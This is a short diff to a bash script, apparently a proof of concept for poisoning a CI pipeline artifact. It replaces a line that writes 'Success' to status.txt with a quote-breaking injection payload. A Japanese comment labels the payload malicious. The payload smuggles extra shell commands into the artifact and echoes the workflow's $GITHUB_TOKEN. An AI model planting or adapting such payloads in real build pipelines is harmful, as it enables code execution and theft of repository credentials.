@@ -1,3 +1,3 @@
 #!/bin/bash
-# 通常はテストが成功したかどうかをファイルに書き出します
-echo "Success" > status.txt
+# 悪意のあるインジェクション・ペイロードをアーティファクトに仕込む
+echo 'Failed"; echo "🚨🚨🚨 RCE EXPLOIT SUCCESS 🚨🚨🚨"; echo "Privileged Token is: $GITHUB_TOKEN"; #' > status.txt
